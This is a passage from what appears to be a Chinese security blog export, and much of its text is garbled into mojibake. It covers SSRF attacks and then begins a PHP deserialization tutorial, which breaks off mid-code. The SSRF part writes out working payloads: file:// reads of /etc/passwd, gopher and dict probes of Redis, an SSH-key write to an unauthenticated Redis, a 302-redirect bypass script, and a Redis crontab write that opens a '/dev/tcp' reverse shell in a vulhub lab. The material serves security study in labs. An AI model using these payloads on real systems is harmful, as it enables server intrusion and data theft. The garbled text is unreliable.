æ­¤æ®µå‡½æ•°çš„ä¸»è¦åŠŸèƒ½å°±æ˜¯è·å–getå‚æ•°ä¸­çš„urlçš„å€¼ï¼Œç„¶åé€šè¿‡curl_exec()æ‰§è¡Œç›¸åº”çš„ä¼šè¯ï¼Œæ­¤å‡½æ•°åº”è¯¥åœ¨å‚æ•°$chè¢«åˆå§‹åŒ–å¹¶è®¾ç½®ç›¸åº”çš„é€‰é¡¹åæ‰èƒ½è¢«è°ƒç”¨ã€‚ ä¸‹é¢æˆ‘ä»¬åˆ†åˆ«é€šè¿‡gopherã€dictã€fileåè®®å¯¹ä¸»æœºè¿›è¡Œç›¸åº”çš„æ”»å‡» åˆ©ç”¨æ–¹å¼ 12345678//filecurl http://127.0.0.1?url=file:///etc/passwd//dictcurl http://127.0.0.1?url=dict://127.0.0.1:3306/info//gopher æ¢æµ‹redisç«¯å£curl http://127.0.0.1?url=gopher://127.0.0.1:6379/_payload SSRF redisæœªæˆæƒé¦–å…ˆæ˜ç¡®ä¸€ä¸ªä¸œè¥¿ï¼Œä»€ä¹ˆæ˜¯redisï¼Ÿrediså°±æ˜¯ä¸€ä¸ªæ•°æ®åº“ï¼Œç”¨Cè¯­è¨€ç¼–å†™ï¼Œç›¸è¾ƒäºmssqlã€mysqlè¿™äº›æ•°æ®åº“ï¼Œredisæ”¯æŒå­˜å‚¨çš„æ•°æ®ç±»å‹æ›´å¤šï¼Œæ”¯æŒçš„æ•°æ®æ“ä½œä¹Ÿæ›´å¤šã€‚ ä¸ºä»€ä¹ˆä¼šæœ‰redisæœªæˆæƒè®¿é—®æ¼æ´å‘¢ï¼Ÿ å› ä¸ºredisåœ¨å®‰è£…æ—¶ï¼Œé»˜è®¤æƒ…å†µä¸‹æ˜¯å°†æœåŠ¡ç»‘å®šåœ¨æœåŠ¡å™¨çš„0.0.0.0:6379ç«¯å£ä¸‹ï¼ˆå¦‚æœé…ç½®äººå‘˜ä¸åšæ›´æ”¹çš„è¯ï¼‰ï¼Œè¿™æ ·ä¼šå°†redisæœåŠ¡æš´éœ²åœ¨å…¬ç½‘ä¸Šï¼Œå¦‚æœåœ¨æœªå¼€å¯è®¤è¯çš„æƒ…å†µä¸‹ï¼Œä¼šå¯¼è‡´ä»»æ„ç”¨æˆ·è®¿é—®redisæœåŠ¡å™¨ï¼Œå¹¶è¯»å–redisæ•°æ®åº“ä¸­çš„æ•°æ®ä¿¡æ¯ã€‚è¿˜å¯ä»¥åˆ©ç”¨ç›¸å…³redisæ–¹æ³•ï¼Œå‘redisæ•°æ®åº“ä¸­å†™å…¥å…¬é’¥ï¼Œè¿›è€Œè·å¾—ç§é’¥ç™»å½•ç›®æ ‡æœåŠ¡å™¨ã€‚ å®è·µä¸€ å—å®³æœºç¯å¢ƒè¯´æ˜ï¼šubuntuè™šæ‹Ÿæœºä¸‹è£…äº†dockerçš„ç¯å¢ƒï¼Œå¹¶å°†dockerçš„6379ç«¯å£æ˜ å°„åˆ°Ubuntuçš„6379ç«¯å£ä¸Šï¼Œipï¼š192.168.128.138 æ”»å‡»æœºç¯å¢ƒï¼škali é¦–å…ˆç”¨nmapæ¢æµ‹ä»¥ä¸‹6379ç«¯å£ 1nmap -A -p 6379 -script redis-info 192.168.128.138 å¯ä»¥å¾—åˆ°redisçš„ç›¸å…³ä¿¡æ¯ã€‚ ç”¨kaliçš„æœ¬åœ°redisæœåŠ¡è®¿é—®redisæœåŠ¡å™¨ã€‚ æŸ¥çœ‹keyä¿¡æ¯ 12keys *get key æœ¬åœ°ç”Ÿæˆä¸€ä¸ªsshå¯†é’¥ 12ssh-keygen -t rsa //ç”Ÿæˆå¯†é’¥(echo -e &quot;\\n\\n&quot;;cat /root/.ssh/id_rsa.pub;echo -e &quot;\\n\\n&quot;) &gt; key.txt //å°†å¯†é’¥å†…å®¹å†™å…¥key.txt,\\næ¢è¡Œçš„åŸå› æ—¶é¿å…ä¸redisæ•°æ®åº“ç¼“å†²åŒºä¸­çš„å…¶ä»–æ•°æ®æ··åˆ ä¸Šä¼ åˆ°ç›®æ ‡æœåŠ¡å™¨ 1cat /key.txt | /usr/bin/redis-cli -h 192.168.128.138 -x set xxx //-xå‚æ•°çš„ä½œç”¨æ˜¯ï¼šè¡¨ç¤ºå°†æ ‡å‡†è¾“å…¥çš„å†…å®¹ä½œä¸ºæœ€åä¸€ä¸ªå‚æ•°çš„å†…å®¹ï¼Œè¿™æ®µå‘½ä»¤çš„ä½œç”¨æ˜¯å°†key.txtçš„å†…å®¹ä½œä¸ºxxxé”®çš„å€¼ æœ€ååœ¨æ”»å‡»æœºç”¨ç”¨sshç™»å½•ã€‚(ä¸€èˆ¬å®é™…æƒ…å†µè¿™ç§ç†æƒ³æƒ…å†µå¾ˆå°‘è§) å®è·µäºŒå®è·µ2ç”¨På¸ˆå‚…çš„ä¸€ä¸ªdockerç¯å¢ƒï¼Œweblogic-ssrfï¼Œå®‰è£…ç•¥è¿‡ï¼Œåœ°å€ï¼šhttps://vulhub.org/#/environments/weblogic/ssrf/ weblogicæœºå™¨IPï¼š172.18.0.3 redisæœºå™¨IPï¼š172.18.0.2 é¦–å…ˆæ¥åˆ°å­˜åœ¨æ¼æ´çš„é¡µé¢ï¼š Â·http://172.10.0.2:7001/uddiexplorer/SearchPublicRegistries.jspã€‚ ç”¨burpæŠ“ä¸€ä¸ªåŒ…ï¼Œå…³æ³¨operatorè¿™ä¸ªå‚æ•°ï¼Œå¯ä»¥çœ‹åˆ°æ˜¯ä¸€ä¸ªç½‘å€ï¼Œæˆ‘ä»¬è¾“å…¥http://127.0.0.1:7001å‘é€çœ‹çœ‹ å‘é€åï¼Œé¡µé¢å›å¤äº†ä¸€ä¸ªé”™è¯¯ï¼Œ7001è¿™ä¸ªç«¯å£æ˜¯weblogicçš„é»˜è®¤ç«¯å£ï¼Œè¿”å›çš„æ˜¯404çŠ¶æ€ç ï¼Œè¿™è¯´æ˜ä»€ä¹ˆï¼Œè¯´æ˜7001ç«¯å£å¯ä»¥è®¿é—®ï¼Œä½†æ˜¯æ²¡æœ‰æ‰¾åˆ°æˆ‘ä»¬æƒ³è¦çš„èµ„æº ç«¯å£æ”¹ä¸º80å’Œ9999ï¼Œè¿”å›çš„æ˜¯could not connectï¼Œè¯´æ˜è¿™ä¸ªç«¯å£æ˜¯ä¸å¯è®¿é—®çš„ ç°åœ¨æ¢³ç†ä¸€ä¸‹ä¸¤ä¸ªçŠ¶æ€ å¯è®¿é—®ï¼šè¿”å›ç›¸å…³çŠ¶æ€ç  ä¸å¯è®¿é—®ï¼šè¿”å›ä¸å¯è¿æ¥ ä¸‹é¢æˆ‘ä»¬æ¥æ¢æµ‹ä¸€ä¸‹redisæœåŠ¡ã€‚redisçš„é»˜è®¤ç«¯å£ä¸º6379ï¼Œæˆ‘ä»¬æŠŠurlä¿®æ”¹ä¸ºredisæœåŠ¡å™¨çš„åœ°å€å’Œç«¯å£ï¼šhttp://172.18.0.2:6379 è¯´æ˜6379ç«¯å£æ˜¯å¼€æ”¾çš„ï¼ŒæŠŠä¸‹é¢çš„å‘½ä»¤urlç¼–ç ä¸€ä¸‹å‘é€è¿‡å» 1234set 1 &quot;\\n\\n\\n\\n* * * * * root bash -i &gt;&amp; /dev/tcp/172.18.0.1/21 0&gt;&amp;1\\n\\n\\n\\n&quot; config set dir /etc/config set dbfilename crontabsave ç¬¬ä¸€å¥ï¼šä¸€ä¸ªéå¸¸ç»å…¸çš„tcpä¸‹åå¼¹shellçš„å‘½ä»¤ï¼Œè¦åœ¨å‘½ä»¤å‰åå¤šå¢åŠ å‡ è¡Œæ¢è¡Œç¬¦ï¼Œè¿™æ ·ä»¥ä¾¿å°†å‘½ä»¤ä¸rediså­˜å…¥çš„è„æ•°æ®åˆ†éš”å¼€ ç¬¬äºŒæ¡ï¼šå°†redisçš„å­˜å‚¨è·¯å¾„è®¾ç½®ä¸º/etc ç¬¬ä¸‰æ¡ï¼šå­˜å‚¨æ–‡ä»¶åè®¾ç½®ä¸ºdrontabï¼Œä¹Ÿå°±æ˜¯è®¾ç½®ä¸ºä¸€ä¸ªå®šæ—¶ä»»åŠ¡ ç¬¬å››æ¡ï¼šä¿å­˜ å¯ä»¥çœ‹åˆ°æˆåŠŸåå¼¹äº†ä¸€ä¸ªshell SSRF 30x è·³è½¬åŸç†ï¼šå½“è¯·æ±‚çš„URLå­˜åœ¨30xè·³è½¬æ—¶ï¼Œæµè§ˆå™¨ä¼šç»§ç»­è¯·æ±‚è®¾å®šå¥½çš„URL demoæ¼æ´é¡µé¢ï¼Œå­˜åœ¨è¿œç¨‹æœåŠ¡å™¨ä¸Š 1234567891011121314151617&lt;?php function curl($url)&#123; $ch = curl_init(); curl_setopt($ch,CURLOPT_URL,$url); curl_setopt($ch,CURLOPT_FOLLOWLOCATION,true);//è®¾å®šé‡å®šå‘ //é™åˆ¶åè®®ä¸ºhttp/https curl_setopt($ch,CURLOPT_PROTOCOLS,CURLPROTO_HTTP|CURLPROTO_HTTPS); curl_setopt($ch,CURLOPT_HEADER,0); curl_exec($ch); curl_close($ch); &#125; $url = $_GET[&#x27;url&#x27;]; ?&gt; æ„é€ çš„302.phpï¼Œå¹¶å°†æ­¤è„šæœ¬æ”¾åœ¨ä¸€ä¸ªå…¬ç½‘IPä¸Šï¼Œç¡®ä¿ç›®æ ‡æœåŠ¡å™¨å¯ä»¥è¯·æ±‚åˆ° 1234567891011121314&lt;?php $protocol = $_GET[&#x27;s&#x27;]; $ip = $_GET[&#x27;i&#x27;]; $port = $_GET[&#x27;p&#x27;]; $query = $_GET[&#x27;q&#x27;]; if(empty($port))&#123; header(&quot;Location:$protocol://$ip/$query&quot;); &#125; else&#123; header(&quot;Location:$protocol://$ip:$port/$query&quot;); &#125;?&gt; è¯´æ˜ ç›®æ ‡æœåŠ¡å™¨ï¼štest.com å­˜æ”¾è„šæœ¬çš„å…¬ç½‘IPï¼š120.25.65.12 åˆ©ç”¨payloadï¼ˆ%26æ˜¯&amp;çš„URLç¼–ç ï¼Œé¿å…æµè§ˆå™¨å°†å‚æ•°è§£ææˆssrf.phpçš„å‚æ•°ï¼‰ 1234567891011# dict åè®®æ¢æµ‹ dict://127.0.0.1:6379curl -v http://test.com/ssrf.php?url=http://120.25.65.12/302.php?s=dict%26i=127.0.0.1%26p=6379%26q=info# fileåè®® æ–‡ä»¶è¯»å– file:///etc/passwdcurl -v http://test.com/ssrf.php?url=http://120.25.65.12/302.php?s=file%26i=/etc/passwd# gopheråè®®æ”»å‡»redisåå¼¹shell gopher://127.0.0.1:6379/_ç›¸å…³åå¼¹shellçš„payloadcurl -v http://test.com/ssrf.php?url=http://10.25.65.12/302.php?s=gopher%26i=127.0.0.1%26p=3679%26q=_ç›¸å…³åå¼¹shellçš„payload SSRF DNSé‡ç»‘å®šé¦–å…ˆæ¥äº†è§£ä¸¤ä¸ªåŸºæœ¬æ¦‚å¿µ DNSæœåŠ¡å™¨ï¼š è®¡ç®—æœºåŸŸåæœåŠ¡å™¨ã€‚æ˜¯ä¸€ä¸ªå°†åŸŸåå’ŒIPåœ°å€ç›¸äº’æ˜ å°„çš„ä¸€ä¸ªåˆ†å¸ƒå¼æ•°æ®åº“ã€‚ åŸŸåè§£æï¼š å°†ä¸€ä¸ªåŸŸåè§£æåˆ°ä¸€ä¸ªIPåœ°å€ï¼Œè®©äººä»¬å¯ä»¥é€šè¿‡è®¿é—®è¿™ä¸ªåŸŸåæ¥è®¿é—®åˆ°è¿™ä¸ªIPã€‚ Aè®°å½•ï¼šå°†åŸŸåæŒ‡å‘ä¸€ä¸ªIpv4åœ°å€ AAAAè®°å½•ï¼šå°†åŸŸåæŒ‡å‘ä¸€ä¸ªiPv6åœ°å€ Cè®°å½•ï¼šå°†ä¸€ä¸ªåŸŸå1æŒ‡å‘åŸŸå2ï¼Œåˆ™åŸŸå1ä¹Ÿå¯ä»¥é€šè¿‡åŸŸå2æ¥è¿›è¡Œè®¿é—® MIXï¼šå°†åŸŸåæŒ‡å‘ä¸€ä¸ªé‚®ç®±æœåŠ¡å™¨ â€¦.. TTL ç”Ÿå­˜æ—¶é—´ã€‚è¡¨ç¤ºDNSè®°å½•åœ¨DNSæœåŠ¡å™¨ä¸Šç¼“å­˜æ—¶é—´ã€‚ä¹Ÿå°±æ˜¯è¯´å½“ä¸€ä¸ªDNSæœåŠ¡å™¨æˆåŠŸè§£æä¸€ä¸ªåŸŸååï¼Œè¿™ä¸ªè§£æè®°å½•åœ¨æ­¤å°DNSæœåŠ¡å™¨ä¸Šä¿å­˜çš„æ—¶é—´ï¼Œè¶…è¿‡è¿™ä¸ªæ—¶é—´ï¼Œè¯¥è®°å½•å°±ä¼šè¢«é”€æ¯ï¼Œå†æ¬¡è¯·æ±‚æ—¶ï¼Œä¼šé‡æ–°è¿›è¡ŒæŸ¥æ‰¾è§£æã€‚ DNSé‡ç»‘å®šä¸»è¦åˆ©ç”¨çš„æ˜¯å¯ä»¥è®¾ç½®åŸŸåè§£æçš„ç¼“å­˜æ—¶é•¿TTLï¼Œä¸‹å›¾æ˜¯ä¸€ä¸ªç½‘ç«™è¯·æ±‚URLçš„æ­¥éª¤ (å›¾æºç½‘ç»œ) æˆ‘ä»¬çš„åˆ©ç”¨ç‚¹ä¸»è¦åœ¨çº¢è‰²æ¡†æ¡†åœˆå‡ºæ¥çš„è¿™éƒ¨åˆ†æ—¶é—´å†… v ç”±ä¸Šé¢çš„çŸ¥è¯†æˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼Œä¸€ä¸ªåŸŸåçš„è§£æè®°å½•ç¼“å­˜æ—¶é—´å¯ä»¥è®¾ç½®ï¼Œç”±å›¾æˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼ŒæœåŠ¡å™¨çš„ç›¸å…³æ‰§è¡Œé¡ºåºï¼š å…ˆä»DNSæœåŠ¡å™¨è§£æï¼Œè·å¾—URLçš„IPåœ°å€ å°†è·å–çš„IPåœ°å€ä¸é¢„å…ˆè®¾å®šçš„è§„åˆ™è¿›è¡ŒåŒ¹é…ï¼Œåˆ¤æ–­æ˜¯å¦ç¬¦åˆè¯·æ±‚æ¡ä»¶ å¦‚æœç¬¦åˆæ¡ä»¶åˆ™è¿›è¡Œè¯·æ±‚ æˆ‘ä»¬å¯ä»¥åœ¨ç¬¬ä¸€æ­¥å’Œç¬¬ä¸‰æ­¥åšæ–‡ç« ï¼Œæ€è·¯å¦‚ä¸‹ åœ¨æœåŠ¡å™¨ç¬¬ä¸€æ¬¡è¯·æ±‚DNSæœåŠ¡å™¨è·å–IPæ—¶ï¼Œä¹Ÿå°±æ˜¯è¦è·å¾—urlçš„IPè¿›è¡Œåˆ¤æ–­ä¹‹å‰ï¼Œæˆ‘ä»¬å°†åŸŸåçš„IPè§£æåˆ°ä¸€ä¸ªåˆç†çš„å…¬ç½‘IP1ä¸Šï¼Œç„¶åå°†TTLè®¾ç½®æˆ0ï¼› æœåŠ¡å™¨è¿›è¡Œåˆ¤æ–­åï¼Œè®¤ä¸ºè¿™ä¸ªIPç¬¦åˆæ­£å¸¸æ¡ä»¶ï¼Œåˆ™è¿›å…¥ä¸‹ä¸€æ­¥è¯·æ±‚å†…å®¹ï¼Œæˆ‘ä»¬åˆ©ç”¨çš„å°±æ˜¯æœåŠ¡å™¨åˆ¤æ–­çš„è¿™ä¸ªé—´éš™ï¼Œåœ¨è¿™ä¸ªé—´éš™ä¹‹é—´ï¼Œå¦‚æœæˆ‘ä»¬å°†ç½‘å€è§£æåˆ°127.0.0.1çš„è¯ï¼Œé‚£ä¹ˆæœåŠ¡å™¨åç»­å†è¿›è¡Œè¯·æ±‚æ—¶ï¼Œå¦‚æœæ²¡æœ‰ä½¿ç”¨ç¬¬ä¸€æ­¥è¯·æ±‚çš„IPï¼Œè€Œæ˜¯ç›´æ¥ç”¨åŸŸåå»è¯·æ±‚å†…å®¹çš„è¯ï¼Œé‚£å°±å¯èƒ½è¯·æ±‚åˆ°å†…ç½‘çš„ä¸€äº›ä¿¡æ¯ã€‚ ä½†æ˜¯è¿™ä¸ªè¦æ±‚æ¯”è¾ƒé«˜ï¼Œä¸åŒçš„DNSæœåŠ¡å™¨æœ‰ç›¸åº”çš„TTLé™åˆ¶ï¼Œæ¯”å¦‚é˜¿é‡Œäº‘é»˜è®¤10minï¼Œå›½å¤–0ã€‚ https://xz.aliyun.com/t/7495 è¿™é‡Œç•™ä¸ªå‘åé¢è¡¥ï¼Œå­¦å†™DNSè§£ææœåŠ¡å™¨ æ€»ç»“æ¼æ´æˆå›  æœåŠ¡å™¨ç«¯æä¾›äº†å‘å…¶ä»–æœåŠ¡å™¨è¯·æ±‚èµ„æºè·å–æ•°æ®çš„æƒé™ä½†æœªå¯¹è¯·æ±‚çš„ç›®æ ‡åœ°å€åšæœ‰æ•ˆçš„è¿‡æ»¤ã€‚ ç»•è¿‡æ–¹å¼ 302ç»•è¿‡ æ„é€ 302è·³è½¬php IPç¼–ç ç»•è¿‡ hexç¼–ç  123456789127.0.0.1# åå…­è¿›åˆ¶0x7f.0x0.0x0.0x1# å…«è¿›åˆ¶0177.0.0.01#æ··åˆç¼–ç 0177.0.0.0x1 xip.ioç»•è¿‡ï¼šhttp://xip.io/ åè®®ç»•è¿‡ gopher file dictç­‰ DNSé‡ç»‘å®š è¦æ±‚æœåŠ¡å™¨å¯¹èµ„æºçš„è¯·æ±‚ç›´æ¥ä½¿ç”¨curl(ç”¨æˆ·è¾“å…¥çš„ç½‘å€)ï¼Œè€Œä¸æ˜¯æ²¿ç”¨è¿›è¡Œåˆ¤æ–­æ—¶ä½¿ç”¨çš„IP é˜²å¾¡ é’ˆå¯¹å­˜åœ¨urlæ“ä½œçš„ç‚¹è¿›è¡Œç›¸å…³è¿‡æ»¤ã€åˆ¤æ–­ urlç™½åå• ç¦æ­¢30xè·³è½¬ referhttps://joychou.org/web/phpssrf.html https://k-ring.github.io/2019/05/31/å¯¹ä¸‡é‡‘æ²¹gopheråè®®çš„ç†è§£ä¸åº”ç”¨/ https://www.smi1e.top/gopher-ssrfæ”»å‡»å†…ç½‘åº”ç”¨å¤ç°/ https://damit5.com/2018/05/26/SSRF-æ¼æ´å­¦ä¹ / https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf?tdsourcetag=s_pctim_aiomsg https://www.anquanke.com/post/id/86527 https://xz.aliyun.com/t/7495 http://blog.leanote.com/post/snowming/e2c24cf057a4 https://ctf-wiki.github.io/ctf-wiki/web/ssrf-zh/","categories":[],"tags":[{"name":"å®‰å…¨","slug":"å®‰å…¨","permalink":"http://example.com/tags/%E5%AE%89%E5%85%A8/"}]},{"title":"PHPååºåˆ—åŒ–","slug":"PHPååºåˆ—åŒ–","date":"2019-09-17T16:00:00.000Z","updated":"2021-10-22T08:31:03.807Z","comments":true,"path":"2019/09/18/PHPååºåˆ—åŒ–/","link":"","permalink":"http://example.com/2019/09/18/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","excerpt":"åºåˆ—åŒ–ä¸ååºåˆ—åŒ– åºåˆ—åŒ–ï¼šåœ¨PHPä¸­ï¼Œåºåˆ—åŒ–ç”¨äºå­˜å‚¨æˆ–ä¼ é€’ PHP çš„å€¼ï¼ˆæ¯”å¦‚æ•°ç»„æˆ–è€…ç±»çš„å€¼ï¼‰çš„è¿‡ç¨‹ä¸­ï¼ŒåŒæ—¶ä¸ä¸¢å¤±å…¶ç±»å‹å’Œç»“æ„ã€‚å°±æ˜¯å°†æ•°ç»„å’Œç±»çš„å€¼è½¬æ¢æˆå­—ç¬¦ä¸²æ¥ä¼ é€’ã€‚ ååºåˆ—åŒ–ï¼šå°†å·²ç»åºåˆ—åŒ–çš„å¯¹è±¡/æ•°ç»„çš„å­—ç¬¦ä¸²è¿˜åŸæˆå¯¹è±¡/æ•°ç»„æ ¼å¼ã€‚ ä¸ºä»€ä¹ˆè¦åºåˆ—åŒ–ï¼Ÿæœ‰åˆ©äºå­˜å‚¨æˆ–ä¼ é€’ PHP çš„å€¼ï¼ŒåŒæ—¶ä¸ä¸¢å¤±å…¶ç±»å‹å’Œç»“æ„ã€‚","text":"åºåˆ—åŒ–ä¸ååºåˆ—åŒ– åºåˆ—åŒ–ï¼šåœ¨PHPä¸­ï¼Œåºåˆ—åŒ–ç”¨äºå­˜å‚¨æˆ–ä¼ é€’ PHP çš„å€¼ï¼ˆæ¯”å¦‚æ•°ç»„æˆ–è€…ç±»çš„å€¼ï¼‰çš„è¿‡ç¨‹ä¸­ï¼ŒåŒæ—¶ä¸ä¸¢å¤±å…¶ç±»å‹å’Œç»“æ„ã€‚å°±æ˜¯å°†æ•°ç»„å’Œç±»çš„å€¼è½¬æ¢æˆå­—ç¬¦ä¸²æ¥ä¼ é€’ã€‚ ååºåˆ—åŒ–ï¼šå°†å·²ç»åºåˆ—åŒ–çš„å¯¹è±¡/æ•°ç»„çš„å­—ç¬¦ä¸²è¿˜åŸæˆå¯¹è±¡/æ•°ç»„æ ¼å¼ã€‚ ä¸ºä»€ä¹ˆè¦åºåˆ—åŒ–ï¼Ÿæœ‰åˆ©äºå­˜å‚¨æˆ–ä¼ é€’ PHP çš„å€¼ï¼ŒåŒæ—¶ä¸ä¸¢å¤±å…¶ç±»å‹å’Œç»“æ„ã€‚ ç›¸å…³å‡½æ•°serializeï¼š è¯­æ³•æ ¼å¼ï¼šserialize ( mixed $value ) ä½œç”¨ï¼šè¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œæ­¤å­—ç¬¦ä¸²åŒ…å«äº†è¡¨ç¤º value çš„å­—èŠ‚æµï¼Œå¯ä»¥å­˜å‚¨äºä»»ä½•åœ°æ–¹ã€‚ æ —å­1 åœ¨test.phpä¸­ï¼Œå†™æ®µä»£ç æŠŠphpä¸­å¸¸ç”¨çš„ç±»å‹éƒ½åºåˆ—åŒ–ä¸€ä¸‹ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?php class test&#123; var $name; var $age; function __construct($name,$age)&#123; $this-&gt;name = $name; $this-&gt;age = $age; &#125; &#125; $test1 = new test(&#x27;user&#x27;,20); echo(&quot;ç±»åºåˆ—åŒ–ä¹‹å‰æ•°å€¼ç±»å‹ï¼š&quot;.gettype($test1).&quot;&lt;br&gt;&quot;); $testSerialize = serialize($test1); echo($testSerialize); echo(&#x27;&lt;br&gt;&#x27;); echo(&quot;ç±»åºåˆ—åŒ–ä¹‹åæ•°å€¼ç±»å‹ï¼š&quot;.gettype($testSerialize).&quot;&lt;br&gt;&quot;); $arr = array(); $arr[&#x27;phone&#x27;] = 123456; $arr[&#x27;address&#x27;] = &quot;Beijing&quot;; echo(&quot;æ•°ç»„åºåˆ—åŒ–ä¹‹åæ•°å€¼ç±»å‹ï¼š&quot;.gettype($arr).&quot;&lt;br&gt;&quot;); $arrSerialize = serialize($arr); echo(&quot;æ•°ç»„åºåˆ—åŒ–ä¹‹åï¼š&quot;.$arrSerialize.&quot;&lt;br&gt;&quot;); $number = 1; echo(&quot;int åºåˆ—åŒ–ä¹‹åï¼š&quot;.serialize($number).&quot;&lt;br&gt;&quot;); $str = &quot;asdfgh&quot;; echo(&quot;string åºåˆ—åŒ–åï¼š&quot;.serialize($str))?&gt; æ¥çœ‹çœ‹æµè§ˆå™¨çš„è¾“å‡ºï¼š O:4:â€testâ€:2:{s:4:â€nameâ€;s:4:â€userâ€;s:3:â€ageâ€;i:20;} è¿™ä¸²å­—ç¬¦ä¸²ä»£è¡¨ä»€ä¹ˆï¼Ÿ å…ˆæ¥çœ‹å¤§æ‹¬å·å¤–é¢çš„éƒ¨åˆ†ï¼š O:4:&quot;test&quot;:2ï¼šOè¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ªobjectç±»å‹ï¼Œ4è¡¨ç¤ºåˆå§‹åŒ–çš„è¿™ä¸ªç±»åçš„é•¿åº¦ä¸º4ï¼Œtestä¸ºåºåˆ—åŒ–çš„ç±»åï¼ˆæ³¨æ„è¿™é‡Œä¸æ˜¯ä½ ä¼ å…¥çš„å˜é‡åï¼Œè€Œæ˜¯ä½ æœ€åˆåˆå§‹åŒ–çš„é‚£ä¸ªç±»çš„ç±»åï¼‰ï¼Œ2è¡¨ç¤ºè¿™ä¸ªå¯¹è±¡ä¸­çš„å˜é‡ä¸ªæ•° å†æ¥çœ‹å¤§æ‹¬å·é‡Œé¢çš„éƒ¨åˆ†ï¼š &#123;s:4:&quot;name&quot;;s:4:&quot;user&quot;;s:3:&quot;age&quot;;i:20;&#125;ï¼šåˆ†æˆä¸¤éƒ¨åˆ†çœ‹ï¼Œç”¨ä¸­é—´åˆ†å·é—´éš”s:4:&quot;name&quot;;ï¼šè¡¨ç¤ºç¬¬ä¸€ä¸ªå˜é‡åä¸ºnameï¼Œé•¿åº¦ä¸º4ï¼Œç±»å‹ä¸ºstrings:4:&quot;user&quot;;ï¼šç´§è·Ÿåœ¨nameå˜é‡çš„åºåˆ—åŒ–åé¢ï¼Œè¡¨ç¤ºnameè¿™ä¸ªå˜é‡çš„å€¼ä¸ºusers:3:&quot;age&quot;;i:20;ï¼šç¬¬äºŒä¸ªå˜é‡åä¸ºageï¼Œå˜é‡åé•¿åº¦ä¸º3ï¼Œå˜é‡åä¸ºstringç±»å‹ï¼›å˜é‡çš„å€¼ä¸º20ï¼Œä¸ºintç±»å‹ å…¶ä½™çš„è¾“å‡ºä»¥æ­¤æ–¹å¼ç±»æ¨ï¼Œå¯è§ï¼Œå½“ç”¨serializeå‡½æ•°åºåˆ—åŒ–ä¸€ä¸ªå€¼åï¼Œä¼šè®°å½•è¯¥å¯¹è±¡çš„åç§°ï¼Œåç§°é•¿åº¦ï¼ŒåŒ…å«çš„å˜é‡ä¸ªæ•°åŠå˜é‡è¯¦æƒ…ç­‰å†…å®¹ã€‚ æ³¨æ„ï¼šç”±äºserialize()å‡½æ•°åºåˆ—åŒ–çš„æ˜¯å¯¹åº”çš„å®šä¹‰çš„ç±»ï¼Œæ‰€ä»¥å½“ä¸€ä¸ªå¯¹è±¡åœ¨åˆ›å»ºæ—¶ï¼Œå¦‚æœæ²¡æœ‰å¯¹ç±»ä¸­çš„æ‰€æœ‰å˜é‡è¿›è¡Œèµ‹å€¼ï¼Œåœ¨åºåˆ—åŒ–è¯¥å¯¹è±¡çš„æ—¶å€™ï¼Œå®é™…æ˜¯åºåˆ—åŒ–çš„å®šä¹‰çš„ç±»ã€‚ æ —å­2 å¦‚åœ¨testç±»ä¸­æ–°å¢flagå˜é‡ï¼Œä½†æ˜¯åœ¨åˆ›å»ºå¯¹è±¡æ—¶ä¸å¯¹ä»–è¿›è¡Œèµ‹å€¼ï¼Œ 12345678910111213141516171819class test&#123; var $name; var $age; var $flag; function __construct($name,$age)&#123; $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;flag = $flag; &#125; &#125; $test1 = new test(&#x27;user&#x27;,20); echo(&#x27;&lt;br&gt;&#x27;); echo(serialize($test1)); åœ¨åºåˆ—åŒ–çš„æ—¶å€™ä¼šæ˜¯ä¸‹é¢è¿™æ ·ï¼š åœ¨å€¼å¾—é‚£é‡Œä¼šæè¿°ä¸ºNï¼Œå³nullçš„ç¼©å†™ã€‚ æ€»ç»“ å¯ä¼ å…¥çš„æ•°å€¼ç±»å‹ï¼šobjectã€numberã€arrayã€stringç­‰ åºåˆ—åŒ–åçš„æ ¼å¼ï¼šå‚è§ä¸Šæ–‡ unserializeï¼š æ ¼å¼ï¼šunserialize ( string $str ) è¿”å›å€¼ï¼šè¿”å›çš„æ˜¯è½¬æ¢ä¹‹åçš„å€¼ï¼Œå¯ä¸ºintã€stringã€arrayã€objectç­‰ å¦‚æœä¼ é€’çš„å­—ç¬¦ä¸²ä¸å¯è§£åºåˆ—åŒ–ï¼Œåˆ™è¿”å› **FALSE**ï¼Œå¹¶äº§ç”Ÿä¸€ä¸ª **E_NOTICE**ã€‚ ä½œç”¨ï¼šå¯¹ä¼ å…¥çš„stringè¿›è¡Œæ“ä½œï¼Œå°†å…¶è½¬æ¢ä¸ºç›¸åº”çš„phpç»“æ„å¹¶è¿”å› æ —å­3 123456789101112131415161718192021222324&lt;?php class test&#123; var $name; var $age; //var $flag; function __construct($name,$age)&#123; $this-&gt;name = $name; $this-&gt;age = $age; //$this-&gt;flag = $flag; &#125; &#125; $test1 = new test(&#x27;user&#x27;,20); $value_class = &#x27;O:4:&quot;test&quot;:2:&#123;s:4:&quot;name&quot;;s:4:&quot;user&quot;;s:3:&quot;age&quot;;i:20;&#125;&#x27;; echo(&#x27;ååºåˆ—åŒ–ä¹‹å‰æ•°å€¼ä¸ºï¼šO:4:&quot;test&quot;:2:&#123;s:4:&quot;name&quot;;s:4:&quot;user&quot;;s:3:&quot;age&quot;;i:20;&#125;&#x27;); echo(&#x27;&lt;br&gt;&#x27;); var_dump(unserialize($value_class));?&gt; å¯ä»¥çœ‹åˆ°ï¼š ååºåˆ—åŒ–ä¹‹åï¼Œå˜æˆäº†objectã€‚ æ —å­4 æˆ‘ä»¬æ›´æ”¹ä¸€äº›ä»£ç ï¼šåœ¨ç±»ä¸­å¢åŠ å˜é‡flagï¼Œä½†æ˜¯åœ¨åºåˆ—åŒ–çš„å­—ç¬¦ä¸²ä¸­ä¸å¢åŠ ç›¸å…³å†…å®¹ï¼š 12345678910111213141516171819202122class test&#123; var $name; var $age; var $flag;//å¢åŠ çš„å­—æ®µ function __construct($name,$age)&#123; $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;flag = $flag; &#125; &#125; $test1 = new test(&#x27;user&#x27;,20); $value_class = 